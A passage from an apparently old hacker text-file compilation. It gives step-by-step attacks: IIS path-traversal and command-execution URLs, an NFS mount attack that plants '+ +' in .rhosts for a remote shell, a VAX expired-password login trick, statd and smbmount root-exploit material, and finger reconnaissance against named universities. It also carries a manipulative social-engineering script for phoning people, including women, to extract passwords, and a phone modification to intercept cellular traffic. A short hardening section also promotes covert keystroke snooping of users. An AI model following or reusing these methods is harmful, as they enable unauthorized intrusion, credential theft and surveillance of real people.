"ISAPI DLL runs under the security context of the IUSR_MACHINENAME account under IIS, and 
thus inherit the security permissions of that account. However, if the ISAPI DLL can create a 
process using a call to CreateProcess( ). The process created inherits the security context of the 
powerful LocalSystem account rather than IUSR_MACHINENAME, thus creating a hole. Thus, 
any system process can be fired by the ISAPI DLL using this technique.
This can be tried using a generic ISAPI DLL & inserting code for CreateProcess( ) with a process 
name present in the system.
This behaviour is documented in MSDN library on Impersonation : "When a thread is 
impersonating a user, most actions by the thread are done in the security context of the thread's 
impersonation token rather than the primary token of the process that owns the thread. For 
example, an individual thread of a server process can impersonate a client to verify that the client 
is allowed to access a securable object. However, some actions are always done using the 
security context of the process. For example, if an impersonating thread calls the CreateProcess 
function, the new process inherits the primary token of the process rather than the impersonation 
token of the calling thread. Similarly, the system always uses the primary token of the process to 
validate actions requiring the SE_TCB_NAME privilege."

[13.2.7] Rollback.exe

The Windows NT 4.0 Server and Workstation compact discs include a utility called Rollback.exe. 
Rollback.exe was designed to help computer manufacturers preinstall Windows NT 4.0, and allow 
end-users to do the final configuration according to the desired role of the computer. Running this 
utility will remove all registry settings on a system and bring it back to the end of the Character 
Based Setup portion of the Setup program, effectively undoing everything configured by the GUI 
portion of Windows NT Setup.
WARNING: Do not run this file on a production system! There is no way to recover information 
erased by running this utility, so anything stored in the registry will be lost. This includes user 
account information, protocol bindings, application settings, user preferences, etc.
MORE INFORMATION
If you run Rollback.exe on a production system there is no warning that Rollback.exe removes all 
system registry entries. Therfore, after you run Rollback.exe there is no system to rescue or to 
restore as the registry and the Setup.log file no longer exist.
The only fix to this problem is to restore the entire system from a current tape back up. 
Emergency Repair Disk does not restore the system as it requires the Setup.log and specific 
registry components to be present.
Rollback.exe is on the Windows NT compact discs in the following directory:
support\deptools\<system>\

[13.2.8] Replacing System .dll's

System DLLs are called by applications and the registry, and can be replaced with 
trojaned/virused versions. %systemroot% and %systemroot%\system32 directories have default 
permissions of 'Everyone' (includes guest) set to 'Change'. This allows DLLs not in use to be 
replaced. DLLs in use are locked.
DLLs are run by programs at various levels during normal operation. A DLL for example can be 
run with SYSTEM privileges by a service while a user with normal privileges is logged on.
This is also true for the MSGINA.DLL, which is the default "Graphical Identification and 
Authorization" provider for the local console logon, which if replaced, could seriously compromise 
your entire enterprise.

[13.2.9] Renaming Executables

Executables renamed as .xxx files run as executable from command line. Executables can be 
renamed with any extension and run from the command prompt or batch file. Subverts 
filtering/download control by filename extension.
Also executables without a filename extension can be started from the command prompt or batch 
file, as NT will try to run the file as .COM, .EXE, .CMD, or .BAT in that order.
This leaves room for a potential trojan to be introduced into the system.

[13.3.0] Viewing ASP Scripts

DESCRIPTION
A serious security hole was found in Microsoft's Active Server Pages (ASP) by Juan T. Llibre 
<j.llibre@codetel.net.do>. This hole allows Web clients to download unprocessed ASP files 
potentially exposing user ids and passwords. ASP files are the common file type used by 
Microsoft's IIS and Active Server to perform server-side processing. Microsoft confirms that .HTX 
and .IDC files are also vulnerable.
HOW IT WORKS
To download an unprocessed ASP file, simply append a period to the asp URL. For example: 
http://www.domain1.com/default.asp becomes http://www.domain1.com/default.asp. With the 
period appendage, Internet Information Server (IIS) will send the unprocessed ASP file to the 
Web client, wherein the source to the file can be examined at will. If the source includes any 
security parameter designed to allow access to other system processes, such as an SQL 
database, they will be revealed.

[13.3.1] .BAT and .CMD Attacks

Sending a command line to the server, such as 
"http://www.domain.com/scripts/expoit.bat?&commandA+?&commandB" to the server, and then 
clicking the Stop Button on the browser will cause the server to execute DOS commands on the 
server's OS.
Adding a '+?&time' or '+?&date' to the end of the command, will cause the server to pause for 
input. Clicking the Stop Button on the browser will interrupt the server making a log entry of the 
command string executed.

[13.3.2] IIS /..\.. Problem

A URL such as 'http://www.domain.com/..\..' allows you to browse and download files outside of 
the webserver content root directory. A URL such as 
'http://www.domain.com/scripts..\..\scriptname' allows you to execute a target script.
By default user 'Guest' or 'IUSR_MACHINENAME' has read access to all files on an NT disk. 
These files can be browsed, executed or downloaded by wandering guests.

[13.3.3] Truncated Files

A URL such as http://www.domain.com/scripts/exploit.bat>PATH\target.bat will create a file called 
"target.bat". If the file "target.bat" already exists, the file will be truncated, erasing any previous 
contents.

[13.3.4] SNA Holes
--From ntsecurity.net

When you attach to shared folders on an AS/400 using SNA Server, where the security level is 
set to 30 or higher, and security has been set on the folders to allow limited access, after the first 
user connects to a shared folder, all subsequent users acquire the first user's access permissions 
to shared folders.
This problem occurs when SNA Server is sharing a single Local APPC LU when communicating 
to an AS/400. The security for shared folders on the AS/400 (when security is set to level 30 or 
higher), is tied to the controller. In this case, the AS/400 views the controller as its Remote LU, or 
SNA Server's Local APPC LU.
The transaction program which supports the shared folders function on the AS/400 identifies a 
user based on the SNA Server Local APPC LU name being used. Therefore, if multiple SNA 
Server users are sharing the same Local APPC LU for use with shared folders, you are able to 
view each other's AS/400 folders. Due to the design of the AS/400 shared folders feature, the first 
shared folder's user to connect over a Local APPC LU determines the AS/400 security rights for 
the remaining users who connect over the same Local APPC LU.
For Microsoft' information on this, see their Knowledge Base article: 
http://www.microsoft.com/kb/articles/q138/0/01.htm
DEFENSE
Create a separate LU (Local to the SNA Server) for each user and pair each LU with the 
AS/400's LU. Then each user accesses a separate controller and has appropriate access to 
shared folders. In addition, each shared folder's client application must be configured with a 
unique Local APPC LU alias. If you prefer to leave this field empty, the SNA Server administrator 
can assign a default Local APPC LU alias for each user using SNA Admin (2.x) or SNA Server 
Manager (3.x) configured on the user record.

[13.3.5] SYN Flooding

On your computer running the TCP/IP protocol and connected to the Internet, some or all network 
services are rendered unavailable and error messages such as the following appear on the 
network client screen:
The connection has been reset by the remote host.
This symptom of all network services being rendered unavailable may also occur on a computer 
running an operating system other than Windows NT, for example, Unix.
Your computer has become the target of a malicious attack known as TCP/IP "SYN Flooding" or 
"SYN Attacks."
"Computer hackers" can target an entire machine, or a specific TCP service such as web 
services. The attack is focused on the TCP protocol used by all computers on the Internet, and is 
not specific to the Windows NT operating system.
How SYN Flooding Works
SYN Flooding works as follows: (see also CERT(sm) Advisory CA-96.21 at
ftp://info.cert.org/pub/cert_advisories)
- A TCP connection request (SYN) is sent to the target computer. The source IP address in the 
packet is "spoofed," or replaced with an address that is not in use on the Internet, or that belongs 
to another computer. An attacker will send many of these TCP SYNs to tie up as many resources 
as possible on the target computer.
- Upon receiving the connection request, the target computer allocates resources to handle and 
track the new connection, then responds with a "SYN-ACK". In this case, the response is sent to 
the "spoofed" non- existent IP address.
- No response is received to the SYN-ACK. A default-configured Windows NT 3.5x or 4.0 
computer will retransmit the SYN-ACK 5 times, doubling the time-out value after each 
retransmission. The initial time-out value is three seconds, so retries are attempted at 3, 6, 12, 
24, and 48 seconds. After the last retransmission, 96 seconds are allowed to pass before the 
computer gives up on receiving a response, and deallocates the resources that were set aside 
earlier for the connection. The total elapsed time that resources are in use is 189 seconds.
If you suspect that your computer is the target of a SYN attack, you can type the following 
command at a command prompt to view connections in the "SYN_RECEIVED" state:
netstat -n -p tcp
If a large number of connections are in the SYN_RECEIVED state, it is possible that the system 
is under attack. A network analyzer can be used to track the problem down further, and it may be 
necessary to contact your Internet Service Provider for assistance in attempting to trace the 
source.
The effect of tying up connection resources varies, depending upon the TCP/IP stack and 
applications listening on the TCP port. For most stacks, there is a limit on the number of 
connections that can be in the half-open (SYN_RECEIVED) state. Once the limit is reached for a 
given TCP port, the target computer responds with a reset to all further connection requests until 
resources are freed.

[13.3.6] Land Attack

Land Attack sends SYN packets with the same source and destination IP addresses and the 
same source and destination ports to a host computer. This makes it appear as if the host 
computer sent the packet to itself. Windows NT operates more slowly while the host computer 
tries to respond to itself.
 
[13.3.7] Teardrop

Two specially fragmented IP datagrams are sent to the victim. The first is the 0 offset fragment 
with a payload of size N, with the MF bit on (data content is irrelevant). The second is the last 
fragment (MF == 0) with a positive offset < N and with a payload of < N. The fragmented 
datagrams will try to realign themselves, however, the payload of the current fragment does NOT 
contain enough data to cover the realigning. This will cause a reboot or a halt, depending on how 
much physical memory you've got. 

[13.3.8] Pentium Bug

When an Intel processor receives a specific invalid instruction, your computer may stop 
responding (hang). Your computer must be turned off and restarted to return to normal operation.
If you execute F0 0F C7 C8 on a P5 it will lock the machine up.

[14.0.0] VAX/VMS Makes a comeback (expired user exploit)

This is an explenation of a vax exploit that discover.  The exploit 
functions in that when a username has expired it doesnt delete the username
it just puts a new password on the username named temporary password.  Until
the user can input a new password to reactivate his account.  I will explain
this exploit step by step but this text is intended for a more advanced reader. Remember 
VAX/VMS is a very secure area to work in you can get
caught if you dont know what you are doing.  Well in this text i will give 
you a server that has this exploit so you can verify it yourself.
Another thing is that you need to know about how to use the telnet program
if you dont know get a guide and start learning before using this.

Step by Step explanation: (if you dont own an account on the VMS/VAX)

[14.0.1] Step 1:

	Finger the users of the server if you have a finger utility, but you need one that gives you 
the last date login.

[14.0.2] Step 2:
	Get the usernames that have an old date like a year ago, basically, something that looks 
expired.

[14.0.3] Step 3:
	Now goto to the login screen of the server type in the username.
When it promts you for a password you will type the word temp.  Now for this
moment you will be entering the vax system and it will prompt you to type a 
new pssword because the password has expired.  As you can see you now owned
a user priviledge account.  

[14.0.4] Note: 

The easiest way to find systems that are exploitable is to check universities. As we know most 
universities issue students usernames that are the first letter of their first name and then their 
whole last name. Example: If your name is John Doe your username would be jdoe. So the best 
thing you can do is finger universities and try to find as pointed out earlier user names that have 
the last login date of a year or so ago.

-Props to Hellmaster for the technique.

[15.0.0] Linux security 101 

	So you just got the latest linux distro installed? What now? How about a bit of security.  
You need to immediately secure your system after installation if you want your 0-day sploits to be 
safe (especially if you hang out on irc).  Here I will try and show ways to prevent remote and local 
attacks.  These techniques should work on redhat and debian, but it is primarily made for 
slackware, the best distro out there.

[15.0.1] Step 1: pico /etc/inetd.conf .  This file tells inetd what daemons to open up each time it is 
run.  I generally only keep ftpd available to localhost and telnetd open to all.  Close up any 
services that you feel are not imperative to keep you running by sticking a # in front of the service 
name.   

[15.0.2] Step 2: Permissions.  Make sure that your root directory is only readable to root to 
prevent users from snooping.  Type: chmod 700 /root .  Also, make sure that only the correct 
owner can snoop through home directories. cd /home ; chmod 700 * .  That should do it.  Next, 
chmod 700 /mnt ; chmod 700 /floppy ; chmod 700 /cdrom .  Then you should have all the 
permissions setup correctly.  

*Side note: You may want to only use X-windows as root (thats what I do), as X-win binarys are a 
good way to exploit a system.  So maybe do a chmod 700 /usr/X11/bin ; chmod 700 
/usr/X11R6/bin  . 

[15.0.3] Step 3: RPC services.  Try typing rpcinfo -p localhost and see what you get.  Remember 
the results and go into /etc/rc.d .  Look through those files for the various rpc servers.  Comment 
the rpc services as needed in those files.  Almost every remote procedure call is exploitable.  Its 
better just not to run em.

[15.0.4] Step 4: Install ttysnoop. ttysnoop allows you to see what users are doing when they login 
to your box.  Heres how to install: 

Type pico /etc/inetd.conf and stick a comment (#) in front of the line that reads:

 telnet stream  tcp     nowait  root /usr/sbin/tcpd  in.telnetd
 
Then look 3 lines below. You will see:

#telnet stream  tcp     nowait  root    /usr/sbin/tcpd /usr/sbin/in.telnetsnoopd

Uncomment that line, and save the file.  Then restart inetd by typeing:
ps -aux |grep inetd
(get the pid #)
kill -9 (pid #)
inetd

Then it should be restarted and you can try it out by telneting to localhost and logging in , and 
then in another window type w to find out what tty you just logged into and then type: ttysnoop 
ttyp# .  You should now be able to see everything that the user types in.  Very effective.

[15.0.5] Step 5: Watching them.  You should always be aware of who is on your system at any 
given time.  A good way to do this is to, if you are in X-windows, type xconsole -font 5x8 -file 
/var/log/messages -geometry 550x80 . This will open a small xconsole window that will tel you 
who is connecting to you.  Keep this in a bottom corner.  The next step is to get tcpdump.  Find it 
at sunsite.  type tcpdump in a smaill xterm and keep that in another corner.  What that will do is 
show you every single little connection to you.  Such as connections from every port. 

[15.0.6] Step 6: Misc security programs.  
	
               -SSH : Secure shell- This program is a replacement to telnet, so
               that your passwords cannot be sniffed.  It uses encryption
               to connect to every server that you telnet to.  More and
               more servers are using this everday because of the growing
               threat of hackers.  Of course, the remote server that you
               are telneting to has to run SSH as well for it to work =)

        -Lightbar : Login Security- This program is basically a
                    replacement to /bin/login.  It is EXTREMELY
                    customizable and provides that extra edge of security
                    to your login sequence.  

        -COPS : Computer Oracle and Password System- This nice little
                program automatically scans your system for
                misconfigurations and warns you of the weaknesses.  Its an 
                an excellent way to systematically check for file
                permission mistakes.   

By following the above steps, you have stopped about 99.8% of all hackers breaking into your 
system (Just hope you dont meet up with some russian hacker =) You will be invincible on IRC.  
Considering in all my time with Linux, Ive never been hacked.  Peace out.

[16.0.0] Unix Techniques. New and Old.

[16.0.1] ShowMount Technique

This is an old school technique that most hackers don’t know. The two commands you need to 
learn are showmount and mount. 

They are used in the following way:

Intercore:~#mount server.com:/remotefolder /localfolder
After you issue the command then do cd /localfolder and you will be on the remote computers 
shared folder.  The remotefolder is the folder of the remote system that you want to mount. The 
localfolder is where you want the remote folder to appear to be on your system. So if you do 
mount server:/remote /mnt then when you are on your local system you can do cd /mnt and 
browse around inside that folder. The contents of that folder will be the contents of the remote 
folder that you shared. 

[16.0.2] DEFINITIONS:
showmount lists all the clients that have remotely mounted a filesystem from host.  This 
information is maintained by the mountd server on host, and is saved  across  crashes  in the  file  
/etc/rmtab. 
-e    Print the list of shared file systems.

mount attaches a file system to the file system hierarchy at the  mount_point,  which is the 
pathname of a directory.  If mount_point has any contents prior to the  mount  operation, these 
are hidden until the file system is unmounted.

umount unmounts a currently mounted file system,  which  may be specified either as a 
mount_point or as special, the device on which the file system resides.

rhosts The files specify remote hosts and users that are considered trusted.  Trusted users are 
allowed to access the local system without supplying a password. The remote authentication  
procedure  determines  whether  a user  from  a  remote  host  should be allowed to access the 
local system with the identity of a local user.   This  procedure  first  checks  the  /etc/hosts.equiv  
file  and then checks the .rhosts file in the home directory of  the  local user  who  is requesting 
access.  Entries in these files can be of two forms.  Positive entries allow access, while negative  
entries deny access.  The authentication succeeds when
a matching positive entry is  found.
hostname [username]
The special character `+' can be used  in  place  of  either hostname  or  username to match any 
host or user.  For example, the entry
+ + 
gives any user at any host access to the shell without supplying a password.

rpcinfo makes an RPC call to an RPC server and reports  what it finds.  In the first synopsis, 
rpcinfo lists all the registered  RPC services  with  rpcbind  on host.
rpcinfo -p [host]

A showmount on ninja.com would look like this: 
InterCore:/home/chameleon/ $/usr/sbin/showmount -e www.ninja.com
export list for www.ninja.com:
/home      Everyone
/usr    elite.ninja.com
/var    samuri.ninja.com
InterCore:/home/chameleon/ $

The first section is the folder name. The section part is who has access. If it says Everyone then 
anyone at all can access that folder. If it has an address like elite.ninja.com only people from 
elite.ninja.com can access that folder. If there is a users folder shared or a home folder etc… that 
is shared to everyone then you can gain a user account to the system. You would do the 
following. Say we use ninja.com as an example. We earlier saw that we have access to /home we 
would then mount /home and goto a users directory and create us an rlogin for the system. The 
attack would be as follows.

InterCore:/home/chameleon$ /usr/sbin/showmount -e www.ninja.com
export list for www.ninja.com:
/home      Everyone
/usr    elite.ninja.com
/var    samuri.ninja.com

Now, you must su to root to have access to mount things to various folders on the system. 

InterCore:/home/chameleon/ $su
Password:
InterCore:/home/chameleon#
InterCore:/home/chameleon# mount www.ninja.com:/home /mnt
InterCore:# cd /mnt
InterCore:/mnt/ # ls

What you are looking at here is the contents of www.ninja.com's home dir.
Now lets add one of their users to our passfile, so we can become them.

InterCore:# pico /etc/passwd

add the lines:

pamcourt::200:10023:Pam Court:/home/chameleon/mnt/pamcourt/:/bin/bash
                                 ^---we put this as the home dir, because this is                                      where 
the mounted home directory is located.
now, login locally as pamcourt

InterCore:/mnt/home/pamcourt/$ whoami
pamcourt
InterCore:/mnt/home/pamcourt/$ echo "+ +" > ~/.rhosts

This will make the rhosts entry as ++, which means anyone can remotely issue commands from 
it. Now, we remotely login to ninja.com as pamcourt

InterCore:/mnt/home/pamcourt/$rsh -l pamcourt www.ninja.com csh -i
Welcome to ninja.com
We are lame and left open a filesharing backdoor.
You therefore have a shell on ninja.com. The rsh and rlogin syntax is as follows:
rsh [ -l login ] [ -n ] host command
rlogin [ -E | -ex ] [ -l username ] [ -8 ] [ -L ] host

That is how to gain a user account onto a remote system. Also if you can spoof your dns or 
maybe the server has a router on it etc… that you can bounce through you could therefore 
access any files that are shared to that restricted host. Ex: in our above example if we spoofed as 
elite.ninja.com we would then have access to /usr. Although this technique is old it still works on 
many servers. So learn it and use it.

To check if a server has filesharing do: rpcinfo -p server.com
terra:/home/m/mgi/.noid $rpcinfo -p oberon.calstatela.edu
   program vers proto   port  service
    100000    4   tcp    111  rpcbind
    100000    3   tcp    111  rpcbind
    100000    2   udp    111  rpcbind
    100004    2   udp    713  ypserv
    100004    2   tcp    714  ypserv
    100003    2   udp   2049  nfs
If it has a like the above one that says nfs, then it has filesharing.

** smbexpl -- a smbmount root exploit under Linux
**
** Author: Gerald Britton <gbritton@nih.gov>
**
** This code exploits a buffer overflow in smbmount from smbfs-2.0.1.
** The code does not do range checking when copying a username from
** the environment variables USER or LOGNAME.  To get this far into
** the code we need to execute with dummy arguments of a server and a
** mountpoint to use (./a in this case).  The user will need to create
** the ./a directory and then execute smbexpl to gain root.  This code
** is also setup to use /tmp/sh as the shell as bash-2.01 appears to
** do a seteuid(getuid()) so /bin/sh on my system won't work.  Finally
** a "-Q" (an invalid commandline argument) causes smbmount to fail when
** parsing args and terminate, thus jumping into our shellcode.
**
** The shellcode used in this program also needed to be specialized as
** smbmount toupper()'s the contents of the USER variable.  Self modifying
** code was needed to ensure that the shellcode will survive toupper().
**
** The quick fix for the security problem:
**          chmod -s /sbin/smbmount
**
** A better fix would be to patch smbmount to do bounds checking when
** copying the contents of the USER and LOGNAME variables.

[16.0.5] Basic Unix Commands

pwd  - Shows the current directory that you are in.
cd – change directory. Ex: cd hack would put you into the directory hack
cd .. would drop you back 1 directory. So if you are in /home/chameleon and you type cd .. you 
would then be in /home
ls – List files. ls –a to show ALL files. ls –l to list files in long format with byte size etc.. ls –la to do 
both.
chmod – This command changes permissions of a file or directory. The syntax is as follows:
chmod who+,-,=r,w,x
who can be u (user) g (group) o (other) a (all) 
The + means to add the permission and - means to remove the permission. 
cat – This prints out stuff to the screen. Such as files. Ex: cat /etc/passwd this would print the 
password file to the screen. You could also do cat /etc/passwd > password.txt this would redirect 
the out put of passwd into the file password.txt, that is what the > is used for.
passwd – Changes password to a users account.
ps – Shows what processes you have running. ps –e will show everything that you have running.
grep – Searches for words that you specify. This can be used to search a file for a certain word 
Ex: 
$ grep rhino9 elite.txt
Rhino9 is elite…
$
we could also use this to find a username with out a password in the passwd file. We would do 
cat /etc/passwd | grep ::
mv – Moves (rename) files and directorys. Syntax: mv filename newfilename You can also pass 
folder arguments such as mv /etc/passwd /etc/passwd.txt Example mv command.
$ ls
rhino9
$ mv rhino9 rhino9.txt
$ ls
rhino9.txt
$
cp – Copy. Syntax: cp filename copiedfilename You can also pass folder arguments 
ex: cp /e/beer cp /e/beer.txt
man – Manual pages. Syntax man commandyouneedhelpon. Ex: man grep would give you help 
on the grep command
--help – Get help on certain commands. Ex: finger –help
mkdir – Creates a directory. Syntax: mkdir newdirname
rmdir – Removes a directory. Syntax: rmdir dirname
rm – Removes files and folder. Syntax: rm filename rm –R foldername (most systems)
write – Write to another users terminal. Syntax write user ttyname then hit enter then type stuff 
then ctrl+d
mesg – Turns on or off write access to your terminal. Syntax: mesg y (on) mesg n (off)
su – While you are already logged into a system. You can log in with another account. su 
username
w – Shows who is online.
who – shows who is online.

[16.0.6] Special Chracters in Unix:

* - matches any number of single characters eg. $ ls john* will list all files that begin with john
 [...] - matchs any one of the chracter in the [ ]
? - matches any single chracter
& - runs a process in the backgroung leaving your terminal free
$ - values used for variables also $n - null argument
>- redirectes output ls -la > /tmp/list
< - redirects input to come from a file 
>> - redirects command to be added (appended) to the end of a file
| - pipe output (eg: cat /etc/passwd | mail tk85@hotmail.com will mail tk85@hotmail.com the 
/etc/passwd file)

[16.0.7] File Permissions Etc..

-rwxrwxrwx   1 user      group         5 Dec 22 12:52 filename
The first section is the file permissions, read & write etc..
If the first character is:
-    - is an ordinary file
d   - is a directory
b   - is a block file
c   - is a character file
The next 3 characters after the first char, are the owners rights to the file. They can be r or w or x 
or all 3 or whatever. The second 3 characters are the group rights to the file and they can be r or 
w or x or all 3 or whatever. The last 3 characters are everyone elses rights to the file and they can 
be r or w or x. 
r – read
w - write
x – execute
The next section after –rwxrwxrwx is how many files are within that folder. If it is not a folder then 
it will be 1 and if it is a folder then it will be how many files are in it. The next section after that is 
the username section. It is the username of the owner of the file. So therefore whoever’s name is 
there has the owner rights as described earlier. Then after that is the groupname. It is the name 
of the group that the file is in. Whatever the groupname is the group rights apply to it. Then 
comes the file size then the file date and lastly the file name.

[16.0.8] STATD EXPLOIT TECHNIQUE

Statd Is one of the best c file exploits in a long time. Statd single handedly exploits SunOS X.X & 
Sys V systems. It works by exploiting a buffer overflow through rpc and drops you into root on a 
remote system. There are statd scanners and other neat tools that can be found at, 
www.d-lab.com.ar/sekret/warez (home of the famous Code Zero). Once you have the statd exploit 
program (runs on some sunos & sys v servers) you will want to either use a scanner to scan a 
large list of servers for statd exploitable ones. One good way of finding statd exploitable server is 
going to yahoo and then searching for “sys v” then try the different servers that yahoo finds. You 
can use a program called “hosts” by Devix that will dump server names from html files. So if you 
goto yahoo and then search for sys v you could dump all the serves into a text file with the hosts 
program and then use a statd scanner to have it check for statd exploitable servers. Devix’s hosts 
program can be found on the rhino9 site. Ok so say you have found a statd able server. You type 
at your prompt statd server.com Here is a log of an actual hack using statd. Note: Comments 
have *’s around them.

[16.0.9] System Probing

The following are ways in which to gather information from a target host.
For the rest of this topic we will refrer to the target site which will be ninja.com.
These are in no order and are mostly unix commands used to gather information about a system.

[16.1.0] Port scanning:

You can find many port scanners on the internet. Search yahoo for portscan etc…
What is a port scanner?
What a port scanner does is it checks a remote host for open ports, ports listening for a 
connection request or remote services etc… The importance of port scanning a system is to find 
out the services it has open. If we know what services a server has open we can then research 
and try to find flaws for those services. Also we can do certain DoS attacks if we know what ports 
are open. There are many port scanners. Some of the more advanced ones are for unix and can 
not leave a trace on the remote server that you port scanned.

[16.1.1] rusers and finger command:
The commands syntax are as follows:
rusers [-a] [-h] [-i] [-l] [-u] [host ...]
finger 
-v, --version           display version number
-i, -l, -m, --info      display full user information
-b, -s, --brief         opposite of --info; only display login records
-f, --faces             display mugshot for user
-P, --port #p           connect to finger daemon using port or service #p
-h, --help              display this message

Now you will find however that most servers have turned off finger services. Almost no 
WindowsNT servers have finger services and most unix have shut off finger services. The rusers 
command is to check for people logged in with rsh or rlogin (remote login).
Side Note: There used to be an old bug in rlogin where you could type: rlogin –lroot victim.com 
and when the remote server parsed the data it would not read right and you would get root 
access however this technique is old and rarely works anymore. By using finger and rusers we 
can get users names and that right there can lead to access of a system. Take nether.net for 
example. If you finger nether.net
 (finger @nether.net) you will get a list of user names. Now its been my experience that systems 
such as nether.net or places that give access to everyday users, 1 out of 70 or so users picks the 
same user name as there password. So it wouldn’t take much time to finger @nether.net then 
telnet to nether.net and try all the users you got from the finger. Also since you have gotten a list 
of usernames from finger nether.net you could then send e-mails to the users saying that you are 
a system official at nether.net and need to verify there password etc… You would be surprised 
what a little mind games can do for you. Also a good 
finger –l @victim.com can give you information such as the last time a user logged in, what type 
of shell there account is set to use, and where there home directory is. We can also watch for 
patterns in a users access to a system. We could see whether they come on at night or during the 
day. To drop back to the thing of knowing about a person and there information to try and guess 
or talk them out of there password. Here is a finger on purdue. Look at the interesting information 
we can get.

InterCore:/home/chameleon/ $finger @purdue.edu
[purdue.edu]
To use finger to search the Purdue Electronic Directory Service, specify your
query as a person's given name.  You can specify just a last name, a first
name and a last name, or a first name, last name, and middle initial, by
separating them with periods or commas.  For example,
 
        finger smyth@purdue.edu
        finger smyth,veronica@purdue.edu
        finger veronica.j.smyth@purdue.edu
Note: there was a lot more then this but I snipped it to make this shorter. Basically what it is 
saying is you got to put a user@server.com instead of just server.com or in this case, 
purdue.edu.
InterCore:/home/chameleon/ $

So by looking at what it said I see it says finger smyth@purdue.edu as an example. Now this is 
probably the same example that comes with this particular finger daemon but what the hell, lets 
try it.

InterCore:/home/chameleon/ $finger smyth@purdue.edu

Now this helps us in some ways and doesn’t. We can see through this finger full names of 
students and what there major is. So what you ask? You know how much information you can get 
from someone’s legal full name? Chameleon will teach you how much later on in this document. 
So yes this finger was good because it got us personal information about a few account holders 
at purdue.edu even an administrators number but, what are the user names to these accounts? 
Well most universities issues there students accounts in the same way. They usually make the 
username for a students account first letter of first name and then full last name. So if your name 
is Kevin Hall your user name would be khall@purdue.edu. Now we could then try and finger that 
user. So we would do the following:

InterCore:/home/chameleon/ $finger khall@purdue.edu
[purdue.edu]

Output of your query: khall

Name                               Dept/School           Phone                Status

We see that the finger dameon says for a more detailed response to do 
finger query_khall@direcroty.purdue.edu So we type in the command

InterCore:/home/chameleon/ $finger query_khall@directory.purdue.edu
[scribe.cc.purdue.edu]

Now this is interesting. We have a user name, khall, we have the users full name, Kevin G. Hall 
and we know his title and department. So from this information you will learn later you can get his 
home phone number and address. If we were to give the student a call at their house or dorm 
etc… It wouldn’t be too hard for anyone with a little bit of social engineering skills to talk this user 
out of his password. 
There is a basic example of how to get information about a logged on user.  

[16.1.2] Mental Hacking, once you know a username.

Note: This is mostly going to work for systems that provide users with accounts and not company 
servers.
If you (the (cracker/hacker) are a Male then you would want to try to finger and get a username of 
a woman. You could then do 2 things. You will probably get there full name but if not read my 
(chameleons) later paper about getting people’s information. For simplicities sake say you 
already have the users phone number which might sound hard to do but isn’t. So say you have 
their phone number and it’s a woman. Call the lady up. A true social engineer will know right 
away what kind of woman it is. On you can push over and mow down or one that has a strong 
head on her shoulders. If she answers and sounds lame then go for the approach of a stern voice 
saying its imperative etc… that you verify her user name and password. If the lady seems to have 
a strong head on her shoulders then you would want to talk nicer and flirt a bit. If you are a 
woman (cracker/hacker) then you will want to find a males account. Women let me tell you this. 
The best hackers and crackers out there are women. If you are a woman then you will want to try 
to get into a male’s account. Once you have a male account holders phone number call him up. 
Women you got it easier see you don’t need to know what type of guy it is. All guys are horny. So 
talk with your sexy voice. Flirt with them etc… It is easier for women to talk people out of 
passwords. If you are a guy (cracker/hacker) and are trying to get a guys password then have a 
girlfriend of yours try to do it. Remember this most of all, KNOW the person you are calling. You 
could call them up and tell them you are from the local high school and are doing a survey and 
then ask them a bunch of questions to get to know what they like and then when you later call to 
get there password you use this information to get on there better side and win there trust. This is 
called mental hacking and it is not that hard at all. One thing that the hackers of today have lost is 
there social skills. Some systems don’t have software exploits. Sometimes you have to go the 
extra mile. Note: Don’t get me wrong and think I am some weirdo about the way I talked about 
men and women but, I do know people well.

[17.0.0] Making a DDI from a Motorola Brick phone
By Virtual of Cybrids CSE
www.cybrids.org


OK, here it is, i'm not gonna talk about it a whole lot, just tell you 
what i've done, and what i want to see done. As of this point I have 
found the Clock, Data, and the spot where you would feed your audio input 
from your scanner that has WBFM.

First you will need to locate the chip that has the clock and data pins. 
This will be labeled SC3800xxFN, or something close to that, xx being some 
numbers. Having trouble already, then i'll tell ya another way, its the 
biggest PLCC (square) chip in the phone.  Now look at the chip, there is a 
notch on the front of it which means pin 1. Now look at the opposite side 
of that dot, to the pins on the bottom, count over from the left, pins 8 
and 9 from the left side are the ones you want. I have included a picture 
of the inside of a brick phone. The red arrow points to the side of the 
chip that I am talking about. Pin 8 is the data and Pin 9 is the clock. 
Those are the pins that will be fed to your computer for decoding.

The receiver chip is what you need to modify next. It's on the circuit board 
with the big white rectangle thing, and the big peices of metal, its the 
only square chip you can see. Its got a few numbers on it and i'll put em 
here to help you find it, 185, X94R01, something to that effect, but just 
look for the only PLCC chip visible. I have marked this chip with a blue 
circle.  With the phone oriented like in the picture, cut the trace coming 
from the bottom pin on the right of the chip.  Connect your scanner's OUTPUT 
to the other side of that trace (not the one conecting to the chip).
Cut it in the center so you will have room to solder to either side 
of the wire trace. The pin coming off the chip is what the cellular phone 
is receiving, the other side of the wire trace that you cut is where its 
being sent. 

That about sums up what you need to know, if you have any other non-bonehead 
questions, i'm in #cellular on EFnet most all the time and #Cybrids on
Undernet.

Now here is what I want to see happen, for all the smart guys out there. 
Scanners are cool, but why use it, the phone is capable of receiving the 
RECC without a scanner, I am working on makin this happen right now, but 
with others help, i'm sure this could get done a lot faster, and would 
benefit everyone greatly.

[18.0.0] Pager Programmer

By Virtual of Cybrids CSE

	In order to build a pager programmer, you are going to need a few things.  A soldering 
Iron, the pager you are going to program, and a few brain cells.  You will also need the software 
that is used to program your specific pager which can be found on my web page at the bottom of 
the text. The diagram I have included should be self explanatory but I will say a few things about 
it just incase.  The only chip needed is the Max233 which will convert the serial port voltage down 
to TTL level so the pager can understand it.  Normally a serial port communicates with +15 volts 
being a logic high and -15 being a logic low.  The chip converts this down to TTL which is 0 - 5 
volts where 0 is low and 5 is high.  The chip is shown inside the plastic hood that covers the 
connector.  Make sure your hood is plastic and not metalized as this is real metal coating and will 
short the pins.  This side will plug into your serial port.  The 4 pin connector shown will go to the 
pager.  Where it says +5 volts is where you supply the chip with 5 volts, its not a 5 volt output.  A 
circuit like this could be used to generate the +5 volts using the very common 7805 voltage 
regulator.                  _________
                            |       |
                            | 7805  |
                            |_______|
                             |  |  |
                 Vin ________|  |  |_________Vout
                                |
                              -----
                               --- gnd
                                -     
Vin  = Voltage in, 6-12 volt wall adaptor, + goes to Vin, - goes to gnd
Vout = +5 volts out
gnd = ground, could be thought of as minus


	You will also have to supply your pager with power, which is probably 1.5 volts.  Then 
you will have to find the transmit and receive pins on your pager and hook it up to the 
programmer accordingly.  The only way to do this is to open up your pager and look around for 
something that might look like a programming connector or pad with 3 or 4 wires, don't confuse 
